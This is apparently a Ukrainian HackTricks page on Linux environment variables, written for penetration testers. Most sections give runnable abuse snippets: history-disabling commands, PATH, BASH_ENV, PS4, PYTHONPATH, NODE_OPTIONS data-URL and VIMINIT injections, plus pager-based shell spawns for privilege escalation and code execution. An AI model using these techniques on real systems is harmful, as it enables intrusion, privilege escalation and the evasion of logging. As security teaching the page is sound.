# Змінні середовища Linux

{{#include ../../banners/hacktricks-training.md}}

## Глобальні змінні

**Глобальні змінні** успадковуються **дочірніми процесами**.

Ви можете створити глобальну змінну для поточного сеансу, виконавши:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ця змінна буде доступна у ваших поточних сесіях і дочірніх процесах.

Ви можете **видалити** змінну за допомогою:
```bash
unset MYGLOBAL
```
## Локальні змінні

**Локальні змінні** можуть бути **доступні** лише з **поточної оболонки/скрипту**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Перелік поточних змінних
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Вміст `/proc/*/environ` розділено **NUL-байтами**, тому ці варіанти зазвичай легше читати:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Якщо ви шукаєте **credentials** або **цікаву конфігурацію сервісів** у успадкованих середовищах, також перевірте [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Загальні змінні

З: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – дисплей, який використовується **X**. Зазвичай цю змінну встановлено в **:0.0**, що означає перший дисплей на поточному комп’ютері.
- **EDITOR** – бажаний текстовий редактор користувача.
- **HISTFILESIZE** – максимальна кількість рядків у файлі історії.
- **HISTSIZE** – кількість рядків, доданих до файлу історії після завершення користувачем сеансу
- **HOME** – ваш домашній каталог.
- **HOSTNAME** – ім’я хоста комп’ютера.
- **LANG** – ваша поточна мова.
- **MAIL** – розташування поштової скриньки користувача. Зазвичай **/var/spool/mail/USER**.
- **MANPATH** – список каталогів для пошуку сторінок посібника.
- **OSTYPE** – тип операційної системи.
- **PS1** – типовий prompt у bash.
- **PATH** – містить шляхи до всіх каталогів, у яких знаходяться бінарні файли, що їх потрібно виконувати, вказуючи лише ім’я файлу, а не відносний або абсолютний шлях.
- **PWD** – поточний робочий каталог.
- **SHELL** – шлях до поточної командної оболонки (наприклад, **/bin/bash**).
- **TERM** – поточний тип термінала (наприклад, **xterm**).
- **TZ** – ваш часовий пояс.
- **USER** – ваше поточне ім’я користувача.

## Цікаві змінні для hacking

Не кожна змінна однаково корисна. З offensive perspective пріоритет слід надавати змінним, які змінюють **шляхи пошуку**, **startup files**, **поведінку dynamic linker** або **audit/logging**.

### **HISTFILESIZE**

Змініть **значення цієї змінної на 0**, щоб після **завершення сеансу** **файл історії** (\~/.bash_history) було **обрізано до 0 рядків**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Змініть **значення цієї змінної на 0**, щоб команди **не зберігалися в історії в пам'яті** та не записувалися назад у **файл історії** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Якщо **значення цієї змінної встановлено як `ignorespace` або `ignoreboth`**, будь-яка команда, перед якою додано пробіл, не зберігатиметься в історії.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Вкажіть для **файлу історії** значення **`/dev/null`** або повністю скасуйте його. Зазвичай це надійніше, ніж лише змінити розмір історії.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Процеси використовуватимуть оголошений тут **proxy**, щоб підключатися до Інтернету через **http або https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy та no_proxy

- `all_proxy`: проксі за замовчуванням для інструментів/протоколів, які його підтримують.
- `no_proxy`: список обходу (хости/домени/CIDR), які мають підключатися безпосередньо.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Залежно від інструмента можуть використовуватися варіанти в нижньому та верхньому регістрі (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Процеси довірятимуть сертифікатам, зазначеним у **цих змінних середовища**. Це корисно, щоб змусити такі інструменти, як **`curl`**, **`git`**, HTTP-клієнти Python або менеджери пакетів, довіряти CA, контрольованому attacker (наприклад, щоб proxy для interception виглядав легітимним).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Якщо привілейована обгортка/скрипт виконує команди **без абсолютних шляхів**, перша контрольована атакувальником директорія в `PATH` має пріоритет. Це примітив, що лежить в основі багатьох **PATH hijacks** у `sudo`, cron jobs, shell wrappers і власних SUID helpers. Шукайте `env_keep+=PATH`, слабкий `secure_path` або wrappers, які викликають `tar`, `service`, `cp`, `python` тощо за іменем.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Для повних ланцюжків Privilege Escalation із використанням `PATH` див. [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME і XDG_CONFIG_HOME**

`HOME` — це не лише посилання на каталог: багато інструментів автоматично завантажують **dotfiles**, **plugins** і **per-user configuration** із `$HOME` або `$XDG_CONFIG_HOME`. Якщо привілейований workflow зберігає ці значення, **config injection** може бути простішим за binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Цікавими цілями є `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` і файли, специфічні для інструментів, наприклад `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ці змінні впливають на **dynamic linker**:

- `LD_PRELOAD`: примусово завантажує додаткові shared objects першими.
- `LD_LIBRARY_PATH`: додає на початок списку каталоги пошуку бібліотек.
- `LD_AUDIT`: завантажує бібліотеки-аудитори, які відстежують завантаження бібліотек і розв'язання символів.

Вони надзвичайно цінні для **hooking**, **instrumentation** і **privilege escalation**, якщо привілейована команда зберігає їх. У режимі **secure-execution** (`AT_SECURE`, наприклад, для setuid/setgid/capabilities) loader видаляє або обмежує багато з цих змінних. Однак parser bugs на цьому ранньому етапі loader усе ще мають значний вплив, оскільки виконуються **до** цільової програми.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` змінює ранню поведінку glibc (наприклад, налаштування алокатора) і дуже корисна в exploit-лабораторіях. Вона також має значення з погляду безпеки, оскільки **динамічний завантажувач аналізує її на дуже ранньому етапі**. Вразливість **Looney Tunables** 2023 року стала хорошим нагадуванням про те, що одна змінна середовища, яку аналізує завантажувач, може перетворитися на **примітив локального підвищення привілеїв** проти програм SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Якщо **Bash** запускається **неінтерактивно**, він перевіряє `BASH_ENV` і підключає цей файл перед виконанням цільового скрипту. Коли Bash викликається як `sh` або в інтерактивному режимі POSIX-style, також може перевірятися `ENV`. Це класичний спосіб перетворити shell wrapper на виконання коду, якщо середовище контролюється attacker.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ігнорує ці startup files, коли **real/effective IDs відрізняються**; `-p` зберігає effective ID, але не вмикає ці startup files, тому точна поведінка залежить від того, як wrapper запускає shell. Будьте обережні з privileged wrappers, які викликають `setuid()`/`setgid()` **до** запуску Bash: щойно IDs знову збігаються, Bash може довіряти `BASH_ENV`, `ENV` і пов’язаному стану shell, які інакше ігнорувалися б.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Коли Bash працює з увімкненим **xtrace**, він розгортає `PS4` і виводить його перед кожною traced command. `PS4` розгортається як prompt, тому **command substitution** всередині нього виконується. Важливо, що xtrace можна ввімкнути виключно з environment, експортувавши `SHELLOPTS=xtrace` — `-x` у command line не потрібен, — тож будь-який Bash script, який запускає victim, стає засобом виконання коду.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` нічого не робить, доки не активовано xtrace (`SHELLOPTS=xtrace`, `set -x` або `bash -x`), а Bash видаляє `SHELLOPTS` у привілейованих/setuid-контекстах так само, як і `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP та PYTHONINSPECT & PYTHONBREAKPOINT**

Ці змінні змінюють спосіб запуску Python:

- `PYTHONPATH`: додає шляхи пошуку імпортів на початок списку.
- `PYTHONHOME`: змінює розташування дерева стандартної бібліотеки.
- `PYTHONSTARTUP`: виконує файл перед появою інтерактивного запрошення.
- `PYTHONINSPECT=1`: переходить в інтерактивний режим після завершення скрипту.
- `PYTHONBREAKPOINT`: викликає `package.module.callable` (і імпортує його модуль), коли код досягає `breakpoint()`.<sup>[[8]](#references)</sup>

Вони корисні проти скриптів обслуговування, налагоджувачів, shell та обгорток, які запускають Python із середовищем, контрольованим користувачем. `python -E` та `python -I` ігнорують усі змінні `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Нещодавнім прикладом із реального світу була LPE у **needrestart** 2024 року в системах Ubuntu/Debian: scanner, що працював від root, копіював `PYTHONPATH` непривілейованого процесу з `/proc/<PID>/environ`, а потім запускав Python. Опублікований exploit розміщував `importlib/__init__.so` у контрольованому attacker шляхі, завдяки чому Python виконував attacker code під час власної ініціалізації, ще до того, як hard-coded script helper взагалі мав значення.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl має так само корисні startup variables:

- `PERL5LIB`: додавати library directories на початок списку.
- `PERL5OPT`: інжектити switches так, ніби вони передані в кожному командному рядку `perl`.

Це може примусово активувати **automatic module loading** або змінити поведінку interpreter до того, як target script виконає щось важливе. Perl ігнорує ці variables у контекстах **taint / setuid / setgid**, але вони все одно мають велике значення для звичайних wrappers, що запускаються від root, CI jobs, installers і custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` додає **прапорці CLI Node.js** перед аргументами кожного процесу `node`, який успадковує це оточення. Це робить змінну корисною проти wrapper-ів, CI jobs, Electron helpers і sudo rules, які зрештою запускають Node. Найцікавішими прапорцями з offensive perspective зазвичай є:

- `--require <file>`: попередньо завантажує файл CommonJS перед цільовим скриптом.
- `--import <module>`: попередньо завантажує ES module перед цільовим скриптом.

Node відхиляє деякі небезпечні прапорці в `NODE_OPTIONS`, але `--require` і `--import` явно дозволені та обробляються **до** звичайних аргументів командного рядка.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Безфайлове preload із URL `data:`

Коли ви можете встановити `NODE_OPTIONS`, але **не можете записати файл** на цільовій системі (файлова система лише для читання, обмежений API, serverless runtime тощо), `--import` приймає URL `data:text/javascript,`, тому весь payload передається безпосередньо всередині змінної середовища. JavaScript має бути **повністю закодований у форматі URL** — Node обробляє значення як URL, тому будь-який необроблений пробіл (або інший незакодований символ) обрізає payload і спричиняє помилку `SyntaxError`. Це працює в Node 20.6+ — версіях, де `--import` додано до списку дозволених параметрів `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Це поширений спосіб перетворити контроль над `NODE_OPTIONS` на RCE у **керованих cloud runtimes**, функції яких працюють на Node. Наприклад, атакер, який може лише змінювати конфігурацію Lambda (`lambda:UpdateFunctionConfiguration`, без `iam:PassRole` і без оновлення коду), може впровадити `NODE_OPTIONS=--import data:text/javascript,<payload>`, щоб виконати код усередині функції та викрасти облікові дані її execution role. Впроваджений модуль запускається **до** handler, який після цього все одно виконується у звичайному режимі.

Для віддалених gadget chains, які опосередковано встановлюють `NODE_OPTIONS` (наприклад, через prototype-pollution до RCE), див. [цю іншу сторінку](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby пропонує такий самий клас зловживань під час запуску:

- `RUBYLIB`: додає каталоги на початок load path Ruby.
- `RUBYOPT`: впроваджує параметри командного рядка, наприклад `-r`, у кожен запуск `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Вразливості **needrestart** 2024 року показали, що це не лише лабораторний трюк: той самий root-owned helper, який був вразливим до зловживання `PYTHONPATH`, також можна було змусити запустити Ruby з контрольованим атакувальником `RUBYLIB`, завантаживши `enc/encdb.so` з каталогу атакувальника.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim виконують Ex-команди, що містяться у `VIMINIT` (або у його fallback `EXINIT`), під час звичайного запуску. Ex-команди містять `:!cmd` і `:call system(...)`, тому контроль над цією змінною забезпечує виконання коду щоразу, коли жертва відкриває Vim (`root sudo vim`, `crontab -e`, `visudo`, `git`/`less`, що запускають `$EDITOR`, тощо).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Пакетний режим (`vim -es`/`-Es`) пропускає ці змінні, але звичайний інтерактивний запуск їх виконує.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) працює в Linux/macOS (і Windows) та є **.NET application**, тому кілька змінних середовища перетворюють будь-який виклик `pwsh` з успадкованим середовищем на виконання коду — це корисно проти cron/systemd jobs, CI runners і привілейованих wrappers, які запускають `pwsh`.

- `PSModulePath`: PowerShell рекурсивно шукає в кожному каталозі цього списку модулі `.psd1`/`.psm1` і **автоматично завантажує** модуль, щойно вперше згадується команда, яку він експортує. Додайте каталог на початок списку, і код верхнього рівня вашого модуля виконається під час імпорту; оскільки роздільна здатність відбувається в порядку *Alias → Function → Cmdlet*, експортована function може навіть замінити вбудований cmdlet, який викликає жертва.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: переміщує `powershell/Microsoft.PowerShell_profile.ps1`, який виконується під час запуску (якщо не вказано `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly, метод `StartupHook.Initialize()` якого виконується перед `Main` (спільний для кожного .NET application).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API завантажує бібліотеку атакувальника в процес під час запуску (змінні шляхів мають пріоритет над registry; `DOTNET_*` — новіший alias). У Windows PowerShell 5.1 (.NET Framework) використовуйте `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
У Windows `PSExecutionPolicyPreference=Bypass` додатково усуває запобіжний механізм "unsigned scripts blocked", тому розміщений profile/module фактично запускається. Повні PoCs див. на окремій сторінці:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Деякі інструменти не просто читають шлях із environment; вони передають це значення до **shell**, **editor** або **input preprocessor**. Це робить наведені нижче змінні особливо цікавими, коли privileged wrapper запускає `git`, `man`, `less` або подібні text viewers:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: визначають команду pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: визначають команду editor, часто з аргументами.
- `LESSOPEN`, `LESSCLOSE`: визначають pre/post-processors, які запускаються, коли `less` відкриває файл.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git також підтримує **ін'єкцію конфігурації лише через змінні середовища** без запису на диск за допомогою `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` і `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
З точки зору post-exploitation також пам'ятайте, що успадковані середовища часто містять **облікові дані**, **налаштування proxy**, **service tokens** або **cloud keys**. Перегляньте [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md), щоб дізнатися про пошук у `/proc/<PID>/environ` і `systemd` `Environment=`.

### PS1

Змініть вигляд свого prompt.

[**Це приклад**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Це приклад](<../images/image (897).png>)

Звичайний користувач:

![PERL5OPT & PERL5LIB - PS1: Одне, два та три backgrounded jobs](<../images/image (740).png>)

Одне, два та три backgrounded jobs:

![PERL5OPT & PERL5LIB - PS1: Одне, два та три backgrounded jobs](<../images/image (145).png>)

Одне background job, одне зупинене, а остання команда завершилася некоректно:

![PERL5OPT & PERL5LIB - PS1: Одне background job, одне зупинене, а остання команда завершилася некоректно](<../images/image (715).png>)

## References

- [1] [Посібник GNU Bash - Файли запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE у needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Документація Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Поширені змінні середовища - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation у glibc ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Посібник GNU Bash - змінні Bash (`PS4`) і вбудована команда Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Вбудований breakpoint() і PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Документація Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath і автоматичне завантаження модулів PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Налаштування конфігурації debugging і profiling .NET (змінні profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
